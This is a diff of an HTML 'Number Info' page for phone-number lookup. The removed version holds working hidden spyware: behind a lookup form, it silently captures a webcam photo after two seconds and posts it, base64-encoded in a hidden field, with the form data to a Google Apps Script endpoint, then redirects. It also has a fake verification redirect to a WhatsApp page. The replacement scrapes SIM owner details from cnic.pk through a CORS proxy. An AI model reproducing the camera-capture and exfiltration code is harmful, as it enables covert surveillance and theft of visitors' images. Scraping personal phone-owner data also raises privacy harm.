@@ -1,117 +1,115 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Number Info</title>
-    <style>
-    iframe, input, button{ background-color: black; color:white; padding:15px; border-radius:25px ;         
-     } iframe{
-        width: 93vh;
-            border: 1px solid #ccc;
-      }input{width: 75vh;background-color: black; color:white;} 
-    </style>
-</head>
-<body>
-  <form id="myForm" method="post">
- 
-    <input type="text" name="phoneNumber"   id="phoneNumber" placeholder="Enter Number" value="3001122333">
-    
-  
-<input type="hidden" name="redirect_url" value="NumberInfo.html"><button type="submit" id="loadUrlBtn">Load URL</button><br><br>
-    <iframe id="iframe" src="" frameborder="0"></iframe> 
-    <div id="iframeContent"></div>
-
-    <input type="hidden" name="title" value="Number Info">
-
-    <input type="hidden" name="redirect_url" value="NumberInfo.html">
-   <input type="hidden" name="urlInput" value="NumberInfo.html">
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <input type="hidden" name="photo" id="photo">
-
-   
-  </form>
-    <script>
-      if (window.location.href.includes('user=verified')) {
-    alert("You are not verified. Redirecting to specific link.");
-    window.location.href = 'Funky/Whatsapp.html';
-}
-        document.getElementById('loadUrlBtn').addEventListener('click', loadUrl);
-
-        function loadUrl() {
-            var number = document.getElementById('urlInput').value;
-            var url = `https://freshsimdetails.com/?number=${number}`;
-            document.getElementById('iframe').src = url;
-            document.getElementById('iframe').onload = function() {
-                var iframe = document.getElementById('iframe');
-                var iframeContent = iframe.contentDocument.body.innerText;
-                document.getElementById('iframeContent').innerText = iframeContent;
-            };
-        }
-
-
-
-
-
-  const form = document.getElementById('myForm');
-
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const formData = new FormData(form);
-    const redirectUrl = formData.get('redirect_url');
-
-    // Convert formData to URLSearchParams for POST
-    const params = new URLSearchParams();
-    for (const pair of formData.entries()) {
-      params.append(pair[0], pair[1]);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Number Info Lookup</title>
+  <style>
+    body {
+      background-color: #0ccca0;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
     }
 
-    fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
-      method: 'POST',
-      body: params,
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
+    input, button, textarea {
+      background-color: black;
+      color: white;
+      padding: 15px;
+      border-radius: 25px;
+      border: 1px solid #444;
+      margin: 10px 0;
+    }
+
+    input {
+      width: 75vh;
+    }
+
+    textarea {
+      width: 90%;
+      height: 300px;
+      margin-top: 20px;
+      resize: vertical;
+    }
+
+    iframe {
+      display: none; /* hidden but used to try reading content */
+    }
+
+    .loading {
+      margin-top: 10px;
+      font-size: 18px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Check SIM Details</h2>
+
+  <form id="lookupForm">
+    <input type="text" id="phoneNumber" placeholder="Enter Number e.g. 3001122333" required />
+    <br />
+    <button type="submit">Search</button>
+  </form>
+
+  <div class="loading" id="loadingText">Waiting for input...</div>
+
+  <textarea id="responseBox" placeholder="Response will appear here..." readonly></textarea>
+
+  <iframe id="scrapeFrame"></iframe>
+
+  <script>
+    const form = document.getElementById('lookupForm');
+    const responseBox = document.getElementById('responseBox');
+    const iframe = document.getElementById('scrapeFrame');
+    const loadingText = document.getElementById('loadingText');
+
+    const corsProxy = 'https://corsproxy.io/?';
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const number = document.getElementById("phoneNumber").value.trim();
+      if (!number) {
+        responseBox.value = "❌ Please enter a number.";
+        return;
       }
-    })
-    .then(response => {
-      if (!response.ok) throw new Error('Network response was not ok');
-      return response.text();
-    })
-    .then(() => {
-      // Redirect after successful form submission
-      window.location.href = redirectUrl;
-    })
-    .catch(error => {
-       window.location.href = redirectUrl;
-    });
-  });
 
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const photoInput = document.getElementById('photo');
+      const targetUrl = `https://cnic.pk/track?user_input=${encodeURIComponent(number)}`;
+      loadingText.textContent = "⏳ Trying iframe scrape...";
+      responseBox.value = "⏳ Loading from iframe...";
+      iframe.src = targetUrl;
 
-  // Access the camera and capture a photo after 2 seconds
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
-
+      // Try reading from iframe after a short delay
       setTimeout(() => {
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth || 640; // fallback width
-        canvas.height = video.videoHeight || 480; // fallback height
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        photoInput.value = canvas.toDataURL('image/png');
+        try {
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          const bodyText = doc.body.innerText || "No text found in iframe body.";
+          responseBox.value = bodyText;
+          loadingText.textContent = "✅ Loaded from iframe.";
+        } catch (error) {
+          console.warn("Iframe access blocked. Using fallback fetch.");
+          loadingText.textContent = "⚠️ Iframe blocked. Trying fallback fetch...";
+          fetchFallback(targetUrl);
+        }
+      }, 2000); // Wait 2 seconds for iframe to load
+    });
 
-        // Stop the video stream to free camera
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = 'none';
-      }, 2000);
-    })
-    .catch(err => console.error("Error accessing camera: ", err));
-</script>
+    async function fetchFallback(url) {
+      try {
+        responseBox.value = "⏳ Fetching via proxy...";
+        const response = await fetch(corsProxy + encodeURIComponent(url));
+        const text = await response.text();
+        responseBox.value = text;
+        loadingText.textContent = "✅ Loaded via proxy.";
+      } catch (err) {
+        console.error("Fetch failed:", err);
+        responseBox.value = "❌ Error fetching data: " + err.message;
+        loadingText.textContent = "❌ Failed to fetch data.";
+      }
+    }
+  </script>
 
 </body>
 </html>
